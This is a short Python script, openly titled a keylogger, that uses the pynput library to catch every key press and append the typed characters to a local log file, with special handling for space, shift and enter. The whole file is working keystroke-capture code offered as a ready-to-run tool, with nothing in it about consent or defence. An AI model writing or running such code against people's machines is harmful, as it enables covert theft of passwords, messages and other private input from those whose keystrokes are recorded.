#Keylogger stores whatever was typed in a text file.

# using the 'with' keyword releases the memory automatically


from pynput.keyboard import Listener

def write_To_File(key):

    letter = str(key) #converting to string type
    letter =letter.replace("'","")

    if(letter == 'Key.space'):
        letter= ' '

    if(letter == 'Key.shift' or letter == 'Key.shift_r'):
        letter = ''

    if(letter == 'Key.enter'):
        letter = '\n'

#We can handle other key codes as well as per requirement.

    with open("Keylogger/log.txt",'a') as f:
        f.write(letter)


with Listener(on_press=write_To_File) as l:   # creating an object of Listener
    l.join()    # to join all the letters entered together
